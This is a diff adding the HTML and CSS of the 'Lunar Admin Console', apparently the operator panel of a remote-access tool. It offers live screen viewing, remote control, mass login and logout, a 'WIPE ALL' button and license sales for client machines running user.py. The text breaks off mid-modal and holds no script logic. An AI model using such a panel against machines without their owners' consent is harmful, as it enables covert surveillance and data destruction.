@@ -1,0 +1,2501 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Lunar Admin Console</title>
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    <style>
+        /* ===== GLOBAL RESET & VARIABLES ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --lunar-bg-dark: #0a0c10;
+            --lunar-bg-medium: #12151c;
+            --lunar-bg-card: #181c25;
+            --lunar-bg-header: #0d1017;
+            --lunar-bg-input: #0b0e14;
+            --lunar-bg-log: #07090d;
+            --lunar-border: #232a36;
+            --lunar-text-primary: #f1f5f9;
+            --lunar-text-secondary: #94a3b8;
+            --lunar-text-muted: #64748b;
+            --lunar-accent-blue: #3b82f6;
+            --lunar-accent-blue-hover: #2563eb;
+            --lunar-accent-green: #22c55e;
+            --lunar-accent-green-hover: #16a34a;
+            --lunar-accent-red: #ef4444;
+            --lunar-accent-red-hover: #dc2626;
+            --lunar-accent-orange: #f59e0b;
+            --lunar-accent-orange-hover: #d97706;
+            --lunar-accent-purple: #8b5cf6;
+            --lunar-accent-purple-hover: #7c3aed;
+            --lunar-accent-cyan: #06b6d4;
+            --lunar-accent-cyan-hover: #0891b2;
+            --lunar-online: #4ade80;
+            --lunar-offline: #f87171;
+            --lunar-expired: #dc2626;
+            --lunar-expiring-soon: #facc15;
+            --lunar-warning: #facc15;
+            --lunar-wipe-red: #7f1d1d;
+            --lunar-wipe-red-hover: #991b1b;
+
+            /* Admin console (light) colours */
+            --admin-bg: #FFFFFF;
+            --admin-fg: #000000;
+            --admin-primary: #1A1A1A;
+            --admin-secondary: #2D2D2D;
+            --admin-accent: #3D3D3D;
+            --admin-border: #CCCCCC;
+            --admin-success: #006600;
+            --admin-error: #CC0000;
+            --admin-warning: #996600;
+            --admin-highlight: #E6E6E6;
+            --admin-button-bg: #1A1A1A;
+            --admin-button-fg: #FFFFFF;
+            --admin-entry-bg: #F5F5F5;
+            --admin-entry-fg: #000000;
+            --admin-log-bg: #FAFAFA;
+            --admin-log-fg: #000000;
+            --admin-panel-bg: #F8F9FA;
+            --admin-header-bg: #14324F;
+            --admin-header-fg: #FFFFFF;
+            --admin-tab-selected: #FFFFFF;
+            --admin-tab-unselected: #D9DDE3;
+        }
+
+        html, body {
+            height: 100%;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: var(--lunar-bg-dark);
+            color: var(--lunar-text-primary);
+            -webkit-tap-highlight-color: transparent;
+            overflow: hidden;
+        }
+
+        /* ===== SCROLLBAR ===== */
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #334155;
+            border-radius: 3px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #475569;
+        }
+
+        /* ===== APP CONTAINER ===== */
+        #app {
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden;
+        }
+
+        /* ===== LOGIN GATE ===== */
+        .login-gate {
+            position: fixed;
+            inset: 0;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: var(--lunar-bg-dark);
+            padding: 16px;
+        }
+
+        .login-gate.hidden {
+            display: none;
+        }
+
+        .login-card {
+            width: 100%;
+            max-width: 420px;
+            background: var(--lunar-bg-card);
+            border-radius: 16px;
+            border: 1px solid var(--lunar-border);
+            padding: 24px 20px 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        .login-card .brand {
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            color: var(--lunar-text-primary);
+        }
+
+        .login-card .brand-sub {
+            font-size: 12px;
+            color: var(--lunar-text-muted);
+            margin-top: 2px;
+        }
+
+        .login-card .info-row {
+            display: flex;
+            justify-content: space-between;
+            background: var(--lunar-bg-medium);
+            border-radius: 10px;
+            padding: 10px 14px;
+            margin-top: 12px;
+            border: 1px solid var(--lunar-border);
+        }
+
+        .login-card .info-item {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+
+        .login-card .info-item .label {
+            font-size: 9px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: var(--lunar-text-muted);
+            font-weight: 600;
+        }
+
+        .login-card .info-item .value {
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--lunar-text-primary);
+            word-break: break-all;
+        }
+
+        .login-card .info-item .value.mono {
+            font-family: 'SF Mono', 'Consolas', monospace;
+            font-size: 11px;
+        }
+
+        .login-card .online-badge {
+            color: var(--lunar-online);
+            font-size: 11px;
+            font-weight: 700;
+        }
+
+        .login-card input {
+            width: 100%;
+            padding: 12px 14px;
+            margin-top: 8px;
+            background: var(--lunar-bg-input);
+            border: 1px solid var(--lunar-border);
+            border-radius: 10px;
+            color: var(--lunar-text-primary);
+            font-size: 15px;
+            font-weight: 500;
+            outline: none;
+            transition: border-color 0.2s;
+            font-family: 'SF Mono', 'Consolas', monospace;
+            letter-spacing: 1px;
+        }
+
+        .login-card input:focus {
+            border-color: var(--lunar-accent-blue);
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.15);
+        }
+
+        .login-card input::placeholder {
+            color: var(--lunar-text-muted);
+            font-family: 'Inter', sans-serif;
+            letter-spacing: normal;
+            font-weight: 400;
+        }
+
+        .login-card .btn-row {
+            display: flex;
+            gap: 8px;
+            margin-top: 14px;
+        }
+
+        .login-card .btn {
+            flex: 1;
+            padding: 12px 16px;
+            border: none;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.15s;
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            letter-spacing: 0.3px;
+            touch-action: manipulation;
+        }
+
+        .login-card .btn:active {
+            transform: scale(0.97);
+        }
+
+        .btn-primary {
+            background: var(--lunar-accent-blue);
+            color: #fff;
+        }
+        .btn-primary:hover {
+            background: var(--lunar-accent-blue-hover);
+        }
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            background: #334155;
+            color: #fff;
+        }
+        .btn-secondary:hover {
+            background: #475569;
+        }
+
+        .login-card .status-box {
+            margin-top: 14px;
+            background: var(--lunar-bg-medium);
+            border-radius: 10px;
+            padding: 10px 14px;
+            border: 1px solid var(--lunar-border);
+        }
+
+        .login-card .status-box .label {
+            font-size: 9px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: var(--lunar-text-muted);
+            font-weight: 600;
+        }
+
+        .login-card .status-box .msg {
+            font-size: 13px;
+            font-weight: 600;
+            margin-top: 2px;
+        }
+
+        .login-card .status-box .sub {
+            font-size: 11px;
+            color: var(--lunar-text-muted);
+            margin-top: 2px;
+        }
+
+        /* ===== MAIN CONSOLE ===== */
+        .console {
+            display: none;
+            flex-direction: column;
+            height: 100vh;
+            width: 100vw;
+            background: var(--admin-bg);
+            color: var(--admin-fg);
+        }
+
+        .console.visible {
+            display: flex;
+        }
+
+        .console .topbar {
+            background: var(--admin-header-bg);
+            color: var(--admin-header-fg);
+            padding: 8px 12px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 6px;
+            min-height: 44px;
+            flex-shrink: 0;
+        }
+
+        .console .topbar .title {
+            font-size: 15px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .console .topbar .actions {
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+        }
+
+        .console .topbar .actions button {
+            background: rgba(255, 255, 255, 0.12);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            color: #fff;
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.15s;
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            touch-action: manipulation;
+        }
+
+        .console .topbar .actions button:hover {
+            background: rgba(255, 255, 255, 0.22);
+        }
+
+        .console .topbar .actions button:active {
+            transform: scale(0.96);
+        }
+
+        /* TABS */
+        .tab-bar {
+            display: flex;
+            background: var(--admin-tab-unselected);
+            overflow-x: auto;
+            flex-shrink: 0;
+            scrollbar-width: none;
+            -ms-overflow-style: none;
+        }
+
+        .tab-bar::-webkit-scrollbar {
+            display: none;
+        }
+
+        .tab-bar .tab {
+            padding: 10px 18px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            white-space: nowrap;
+            border: none;
+            background: transparent;
+            color: #455566;
+            transition: all 0.15s;
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            touch-action: manipulation;
+        }
+
+        .tab-bar .tab.active {
+            background: var(--admin-tab-selected);
+            color: var(--admin-header-bg);
+            box-shadow: 0 -2px 0 var(--admin-header-bg) inset;
+        }
+
+        .tab-bar .tab:hover:not(.active) {
+            background: rgba(255, 255, 255, 0.5);
+        }
+
+        .tab-content {
+            flex: 1;
+            overflow-y: auto;
+            padding: 12px;
+            background: var(--admin-bg);
+            position: relative;
+        }
+
+        .tab-pane {
+            display: none;
+        }
+
+        .tab-pane.active {
+            display: block;
+        }
+
+        /* ===== LUNAR PANEL ===== */
+        .lunar-panel {
+            background: var(--lunar-bg-dark);
+            color: var(--lunar-text-primary);
+            min-height: 100%;
+            margin: -12px;
+            padding: 12px;
+        }
+
+        .lunar-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 10px;
+            background: var(--lunar-bg-header);
+            padding: 12px 16px;
+            border-radius: 12px;
+            border: 1px solid var(--lunar-border);
+            margin-bottom: 12px;
+        }
+
+        .lunar-header .brand {
+            font-size: 20px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+
+        .lunar-header .brand-sub {
+            font-size: 11px;
+            color: var(--lunar-text-muted);
+        }
+
+        .lunar-header .actions {
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+        }
+
+        .lunar-header .actions button {
+            padding: 8px 14px;
+            border: none;
+            border-radius: 8px;
+            font-size: 11px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.15s;
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            color: #fff;
+            touch-action: manipulation;
+        }
+
+        .lunar-header .actions button:active {
+            transform: scale(0.96);
+        }
+
+        .btn-purple { background: var(--lunar-accent-purple); }
+        .btn-purple:hover { background: var(--lunar-accent-purple-hover); }
+        .btn-orange { background: var(--lunar-accent-orange); }
+        .btn-orange:hover { background: var(--lunar-accent-orange-hover); }
+        .btn-green { background: var(--lunar-accent-green); }
+        .btn-green:hover { background: var(--lunar-accent-green-hover); }
+        .btn-red { background: var(--lunar-accent-red); }
+        .btn-red:hover { background: var(--lunar-accent-red-hover); }
+        .btn-wipe { background: var(--lunar-wipe-red); }
+        .btn-wipe:hover { background: var(--lunar-wipe-red-hover); }
+        .btn-slate { background: #334155; }
+        .btn-slate:hover { background: #475569; }
+
+        .lunar-stats {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin-bottom: 12px;
+            font-size: 12px;
+            color: var(--lunar-text-secondary);
+        }
+
+        .lunar-stats .stat {
+            background: var(--lunar-bg-card);
+            padding: 6px 14px;
+            border-radius: 20px;
+            border: 1px solid var(--lunar-border);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .lunar-stats .stat .num {
+            font-weight: 700;
+            color: var(--lunar-text-primary);
+        }
+
+        .device-grid, .license-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .device-card, .license-card {
+            background: var(--lunar-bg-card);
+            border: 1px solid var(--lunar-border);
+            border-radius: 12px;
+            overflow: hidden;
+            transition: border-color 0.2s;
+        }
+
+        .device-card:hover, .license-card:hover {
+            border-color: #334155;
+        }
+
+        .device-card .card-header, .license-card .card-header {
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 8px;
+            padding: 10px 14px;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .device-card .card-header .expand, .license-card .card-header .expand {
+            font-size: 12px;
+            color: var(--lunar-text-muted);
+            transition: transform 0.2s;
+            width: 18px;
+            text-align: center;
+        }
+
+        .device-card .card-header .expand.open, .license-card .card-header .expand.open {
+            transform: rotate(180deg);
+        }
+
+        .device-card .card-header .name {
+            font-weight: 700;
+            font-size: 14px;
+            color: var(--lunar-text-primary);
+        }
+
+        .device-card .card-header .badge {
+            font-size: 10px;
+            font-weight: 700;
+            padding: 2px 10px;
+            border-radius: 12px;
+            background: rgba(74, 222, 128, 0.15);
+            color: var(--lunar-online);
+        }
+
+        .device-card .card-header .ip {
+            font-size: 11px;
+            color: var(--lunar-text-muted);
+            font-family: 'SF Mono', 'Consolas', monospace;
+        }
+
+        .device-card .card-header .actions, .license-card .card-header .actions {
+            display: flex;
+            gap: 4px;
+            margin-left: auto;
+            flex-wrap: wrap;
+        }
+
+        .device-card .card-header .actions button, .license-card .card-header .actions button {
+            padding: 5px 10px;
+            border: none;
+            border-radius: 6px;
+            font-size: 10px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.15s;
+            font-family: 'Inter', sans-serif;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            touch-action: manipulation;
+        }
+
+        .device-card .card-header .actions button:active,
+        .license-card .card-header .actions button:active {
+            transform: scale(0.94);
+        }
+
+        .device-card .card-body, .license-card .card-body {
+            display: none;
+            padding: 12px 16px 16px;
+            background: var(--lunar-bg-medium);
+            border-top: 1px solid var(--lunar-border);
+        }
+
+        .device-card .card-body.open, .license-card .card-body.open {
+            display: block;
+        }
+
+        .device-card .card-body .field-grid, .license-card .card-body .field-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px 16px;
+        }
+
+        @media (max-width: 600px) {
+            .device-card .card-body .field-grid, .license-card .card-body .field-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .field {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+
+        .field .label {
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: var(--lunar-text-muted);
+            font-weight: 600;
+        }
+
+        .field .value {
+            font-size: 13px;
+            color: var(--lunar-text-primary);
+            font-weight: 500;
+            word-break: break-all;
+        }
+
+        .field .value.mono {
+            font-family: 'SF Mono', 'Consolas', monospace;
+            font-size: 12px;
+        }
+
+        .field .value.online {
+            color: var(--lunar-online);
+        }
+        .field .value.expired {
+            color: var(--lunar-expired);
+        }
+        .field .value.expiring {
+            color: var(--lunar-expiring-soon);
+        }
+        .field .value.offline {
+            color: var(--lunar-offline);
+        }
+
+        .license-selector {
+            margin-top: 10px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            align-items: center;
+        }
+
+        .license-selector select {
+            flex: 1;
+            min-width: 150px;
+            padding: 8px 10px;
+            background: var(--lunar-bg-input);
+            border: 1px solid var(--lunar-border);
+            border-radius: 8px;
+            color: var(--lunar-text-primary);
+            font-size: 12px;
+            outline: none;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .license-selector select:focus {
+            border-color: var(--lunar-accent-blue);
+        }
+
+        .license-selector button {
+            padding: 8px 14px;
+            border: none;
+            border-radius: 8px;
+            font-size: 11px;
+            font-weight: 700;
+            cursor: pointer;
+            background: var(--lunar-accent-blue);
+            color: #fff;
+            transition: all 0.15s;
+            font-family: 'Inter', sans-serif;
+            touch-action: manipulation;
+        }
+
+        .license-selector button:hover {
+            background: var(--lunar-accent-blue-hover);
+        }
+
+        .license-selector button:active {
+            transform: scale(0.96);
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 40px 16px;
+            color: var(--lunar-text-muted);
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        .empty-state i {
+            font-size: 32px;
+            margin-bottom: 12px;
+            opacity: 0.5;
+        }
+
+        /* LOG TAB */
+        .log-container {
+            background: var(--lunar-bg-log);
+            border-radius: 10px;
+            padding: 14px;
+            min-height: 200px;
+            max-height: 60vh;
+            overflow-y: auto;
+            font-family: 'SF Mono', 'Consolas', monospace;
+            font-size: 12px;
+            line-height: 1.7;
+            color: var(--lunar-text-secondary);
+            border: 1px solid var(--lunar-border);
+        }
+
+        .log-container .log-line {
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .log-container .log-line .time {
+            color: var(--lunar-text-muted);
+            margin-right: 8px;
+        }
+
+        /* ===== SCREEN VIEWER MODAL ===== */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 2000;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+
+        .modal-overlay.open {
+            display: flex;
+        }
+
+        .modal-content {
+            background: var(--lunar-bg-card);
+            border-radius: 16px;
+            border: 1px solid var(--lunar-border);
+            max-width: 960px;
+            width: 100%;
+            max-height: 90vh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        .modal-content .modal-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 18px;
+            background: var(--lunar-bg-header);
+            border-bottom: 1px solid var(--lunar-border);
+            flex-shrink: 0;
+        }
+
+        .modal-content .modal-header .title {
+            font-weight: 700;
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .modal-content .modal-header .close {
+            background: none;
+            border: none;
+            color: var(--lunar-text-muted);
+            font-size: 22px;
+            cursor: pointer;
+            padding: 0 6px;
+            transition: color 0.15s;
+        }
+
+        .modal-content .modal-header .close:hover {
+            color: #fff;
+        }
+
+        .modal-content .modal-body {
+            padding: 16px;
+            overflow-y: auto;
+            flex: 1;
+        }
+
+        .modal-content .modal-body .viewer-area {
+            background: #000;
+            border-radius: 10px;
+            min-height: 300px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--lunar-text-muted);
+            font-size: 14px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .console .topbar .title {
+                font-size: 13px;
+            }
+            .console .topbar .actions button {
+                font-size: 10px;
+                padding: 5px 8px;
+            }
+            .tab-bar .tab {
+                padding: 8px 12px;
+                font-size: 11px;
+            }
+            .lunar-header .brand {
+                font-size: 17px;
+            }
+            .lunar-header .actions button {
+                font-size: 10px;
+                padding: 6px 10px;
+            }
+            .device-card .card-header .actions button,
+            .license-card .card-header .actions button {
+                font-size: 9px;
+                padding: 4px 7px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .login-card {
+                padding: 18px 14px;
+            }
+            .login-card .brand {
+                font-size: 18px;
+            }
+            .device-card .card-header {
+                padding: 8px 10px;
+                gap: 4px;
+            }
+            .device-card .card-header .name {
+                font-size: 12px;
+            }
+            .device-card .card-header .actions button,
+            .license-card .card-header .actions button {
+                font-size: 8px;
+                padding: 3px 6px;
+            }
+            .console .topbar .actions button .label-text {
+                display: none;
+            }
+        }
+
+        /* Utility */
+        .hidden { display: none !important; }
+        .text-online { color: var(--lunar-online); }
+        .text-offline { color: var(--lunar-offline); }
+        .text-expired { color: var(--lunar-expired); }
+        .text-expiring { color: var(--lunar-expiring-soon); }
+        .text-muted { color: var(--lunar-text-muted); }
+        .mt-2 { margin-top: 8px; }
+        .mt-3 { margin-top: 12px; }
+        .mb-2 { margin-bottom: 8px; }
+        .gap-2 { gap: 8px; }
+        .flex { display: flex; }
+        .flex-wrap { flex-wrap: wrap; }
+        .items-center { align-items: center; }
+    </style>
+</head>
+<body>
+
+<!-- ===== LOGIN GATE ===== -->
+<div id="loginGate" class="login-gate">
+    <div class="login-card">
+        <div class="brand">LUNAR ADMIN</div>
+        <div class="brand-sub">License required to open admin console</div>
+
+        <div class="info-row">
+            <div class="info-item">
+                <div class="label">COMPUTER</div>
+                <div class="value" id="loginComputerName">—</div>
+            </div>
+            <div class="info-item" style="text-align:right">
+                <div class="label">STATUS</div>
+                <div class="value online-badge" id="loginOnlineBadge">● ONLINE</div>
+            </div>
+        </div>
+
+        <div class="info-row">
+            <div class="info-item" style="flex:1">
+                <div class="label">PUBLIC IP</div>
+                <div class="value mono" id="loginPublicIp">Loading…</div>
+            </div>
+            <div class="info-item" style="flex:1;text-align:right">
+                <div class="label">DEVICE ID</div>
+                <div class="value mono" id="loginDeviceId">—</div>
+            </div>
+        </div>
+
+        <div style="margin-top:14px">
+            <div class="label" style="font-size:10px;text-transform:uppercase;letter-spacing:0.5px;color:var(--lunar-text-muted);font-weight:600;margin-bottom:4px">LICENSE KEY</div>
+            <input type="password" id="licenseInput" placeholder="Enter license key" autocomplete="off">
+        </div>
+
+        <div class="btn-row">
+            <button class="btn btn-primary" id="loginBtn"><i class="fas fa-sign-in-alt"></i> LOGIN</button>
+            <button class="btn btn-secondary" id="exitBtn"><i class="fas fa-times"></i> EXIT</button>
+        </div>
+
+        <div class="status-box">
+            <div class="label">STATUS</div>
+            <div class="msg" id="loginStatusMsg" style="color:var(--lunar-warning)">Waiting for license…</div>
+            <div class="sub" id="loginStatusSub">Connecting…</div>
+        </div>
+    </div>
+</div>
+
+<!-- ===== MAIN CONSOLE ===== -->
+<div id="console" class="console">
+    <div class="topbar">
+        <div class="title"><i class="fas fa-database"></i> Multi-Project Admin Console</div>
+        <div class="actions">
+            <button id="logoutBtn"><i class="fas fa-sign-out-alt"></i> <span class="label-text">Logout</span></button>
+            <button id="addDbBtn"><i class="fas fa-plus"></i> <span class="label-text">Add DB</span></button>
+            <button id="saveProjectsBtn"><i class="fas fa-save"></i> <span class="label-text">Save Projects</span></button>
+            <button id="openLunarBtn"><i class="fas fa-moon"></i> <span class="label-text">Lunar Panel</span></button>
+        </div>
+    </div>
+
+    <div class="tab-bar" id="tabBar">
+        <button class="tab active" data-tab="lunar"><i class="fas fa-moon"></i> LUNAR PANEL</button>
+        <button class="tab" data-tab="adddb"><i class="fas fa-plus"></i> Add DB</button>
+    </div>
+
+    <div class="tab-content" id="tabContent">
+        <!-- Lunar Panel Tab -->
+        <div class="tab-pane active" id="pane-lunar">
+            <div class="lunar-panel" id="lunarPanel">
+                <div class="lunar-header">
+                    <div>
+                        <div class="brand">LUNAR</div>
+                        <div class="brand-sub">Administrator Control Panel</div>
+                    </div>
+                    <div class="actions">
+                        <button class="btn-purple" id="showAllScreensBtn"><i class="fas fa-desktop"></i> SHOW ALL SCREENS</button>
+                        <button class="btn-orange" id="closeAllScreensBtn"><i class="fas fa-stop-circle"></i> CLOSE ALL</button>
+                        <button class="btn-green" id="loginAllBtn"><i class="fas fa-sign-in-alt"></i> LOGIN ALL</button>
+                        <button class="btn-red" id="logoutAllBtn"><i class="fas fa-sign-out-alt"></i> LOGOUT ALL</button>
+                        <button class="btn-wipe" id="wipeAllBtn"><i class="fas fa-skull"></i> WIPE ALL</button>
+                        <button class="btn-slate" id="refreshLunarBtn"><i class="fas fa-sync"></i> REFRESH</button>
+                    </div>
+                </div>
+
+                <div class="lunar-stats">
+                    <div class="stat"><i class="fas fa-circle text-online"></i> Online: <span class="num" id="statOnlineCount">0</span></div>
+                    <div class="stat"><i class="fas fa-key"></i> Licenses: <span class="num" id="statLicenseCount">0</span></div>
+                </div>
+
+                <!-- Live Computers -->
+                <div style="margin-bottom:8px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:6px">
+                    <div style="font-weight:700;font-size:14px"><i class="fas fa-desktop"></i> Live Computers</div>
+                    <div style="font-size:11px;color:var(--lunar-text-muted)" id="lunarRefreshTime">—</div>
+                </div>
+                <div class="device-grid" id="deviceGrid">
+                    <div class="empty-state"><i class="fas fa-desktop"></i><br>No online computers right now.<br><span style="font-size:12px">Start user.py on a computer and it will appear here.</span></div>
+                </div>
+
+                <!-- Licenses -->
+                <div style="margin-top:20px;margin-bottom:8px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:6px">
+                    <div style="font-weight:700;font-size:14px"><i class="fas fa-key"></i> Licenses</div>
+                    <div style="display:flex;gap:6px;flex-wrap:wrap">
+                        <button class="btn-green" id="createLicenseBtn" style="padding:6px 14px;border:none;border-radius:8px;font-size:11px;font-weight:700;cursor:pointer;color:#fff"><i class="fas fa-plus"></i> CREATE NEW LICENSE</button>
+                        <button class="btn-orange" id="removeExpiredBtn" style="padding:6px 14px;border:none;border-radius:8px;font-size:11px;font-weight:700;cursor:pointer;color:#fff"><i class="fas fa-broom"></i> REMOVE EXPIRED</button>
+                    </div>
+                </div>
+                <div class="license-grid" id="licenseGrid">
+                    <div class="empty-state"><i class="fas fa-key"></i><br>No licenses yet.<br><span style="font-size:12px">Click 'CREATE NEW LICENSE' to add one.</span></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Add DB Tab -->
+        <div class="tab-pane" id="pane-adddb">
+            <div style="max-width:700px;margin:0 auto">
+                <h2 style="font-size:18px;font-weight:700;color:var(--admin-header-bg);margin-bottom:4px"><i class="fas fa-plus-circle"></i> Add Supabase Project</h2>
+                <p style="font-size:12px;color:#5A6B7C;margin-bottom:16px">Enter connection details. Supply the SERVICE ROLE key.</p>
+
+                <div style="background:var(--admin-panel-bg);border:1px solid var(--admin-border);border-radius:10px;padding:16px">
+                    <div style="display:grid;grid-template-columns:1fr;gap:10px">
+                        <div>
+                            <label style="font-size:10px;font-weight:700;color:#5A6B7C;display:block;margin-bottom:3px">Display Name</label>
+                            <input id="addName" type="text" placeholder="My Project" style="width:100%;padding:9px 12px;border:1px solid var(--admin-border);border-radius:8px;font-size:13px;background:var(--admin-entry-bg);outline:none;font-family:Inter,sans-serif">
+                        </div>
+                        <div>
+                            <label style="font-size:10px;font-weight:700;color:#5A6B7C;display:block;margin-bottom:3px">Project ID</label>
+                            <input id="addPid" type="text" placeholder="ofxrxrvcwvcshpaxlusy" style="width:100%;padding:9px 12px;border:1px solid var(--admin-border);border-radius:8px;font-size:13px;background:var(--admin-entry-bg);outline:none;font-family:Inter,sans-serif">
+                        </div>
+                        <div>
+                            <label style="font-size:10px;font-weight:700;color:#5A6B7C;display:block;margin-bottom:3px">Supabase URL</label>
+                            <input id="addUrl" type="text" placeholder="https://xxxxx.supabase.co" style="width:100%;padding:9px 12px;border:1px solid var(--admin-border);border-radius:8px;font-size:13px;background:var(--admin-entry-bg);outline:none;font-family:Inter,sans-serif">
+                        </div>
+                        <div>
+                            <label style="font-size:10px;font-weight:700;color:#5A6B7C;display:block;margin-bottom:3px">Service Role Key (secret)</label>
+                            <input id="addSkey" type="password" placeholder="eyJ..." style="width:100%;padding:9px 12px;border:1px solid var(--admin-border);border-radius:8px;font-size:13px;background:var(--admin-entry-bg);outline:none;font-family:Inter,sans-serif">
+                        </div>
+                        <div>
+                            <label style="font-size:10px;font-weight:700;color:#5A6B7C;display:block;margin-bottom:3px">Anon Key (optional)</label>
+                            <input id="addAkey" type="password" placeholder="eyJ..." style="width:100%;padding:9px 12px;border:1px solid var(--admin-border);border-radius:8px;font-size:13px;background:var(--admin-entry-bg);outline:none;font-family:Inter,sans-serif">
+                        </div>
+                    </div>
+                    <div style="display:flex;gap:8px;margin-top:14px;flex-wrap:wrap">
+                        <button id="testSaveBtn" style="padding:10px 20px;border:none;border-radius:8px;font-size:12px;font-weight:700;cursor:pointer;background:var(--admin-button-bg);color:var(--admin-button-fg);font-family:Inter,sans-serif"><i class="fas fa-flask"></i> Test & Save</button>
+                        <button id="clearAddBtn" style="padding:10px 20px;border:1px solid var(--admin-border);border-radius:8px;font-size:12px;font-weight:700;cursor:pointer;background:transparent;color:var(--admin-fg);font-family:Inter,sans-serif"><i class="fas fa-eraser"></i> Clear</button>
+                    </div>
+                    <div id="addStatus" style="font-size:12px;color:#5A6B7C;margin-top:8px"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ===== MODAL: SCREEN VIEWER ===== -->
+<div id="screenModal" class="modal-overlay">
+    <div class="modal-content">
+        <div class="modal-header">
+            <div class="title"><i class="fas fa-desktop"></i> <span id="modalTitle">Screen Viewer</span></div>
+            <button class="close" id="modalClose">&times;</button>
+        </div>
+        <div class="modal-body">
+            <div class="viewer-area" id="viewerArea">
+                <div style="text-align:center">
+                    <i class="fas fa-spinner fa-spin" style="font-size:28px;margin-bottom:12px;display:block"></i>
+                    Waiting for first frame…
+                </div>
+            </div>
+            <div style="display:flex;gap:8px;margin-top:12px;flex-wrap:wrap">
+                <button id="modalToggleControl" class="btn-purple" style="padding:8px 16px;border:none;border-radius:8px;font-size:12px;font-weight:700;cursor:pointer;color:#fff;font-family:Inter,sans-serif"><i class="fas fa-gamepad"></i> ENABLE REMOTE CONTROL</button>
+                <button id="modalSendClipboard" class="btn-cyan" style="padding:8px 16px;border:none;border-radius:8px;font-size:12px;font-weight:700;cursor:pointer;color:#fff;background:var(--lunar-accent-cyan);font-family:Inter,sans-serif"><i class="fas fa-clipboard"></i> SEND CLIPBOARD</button>
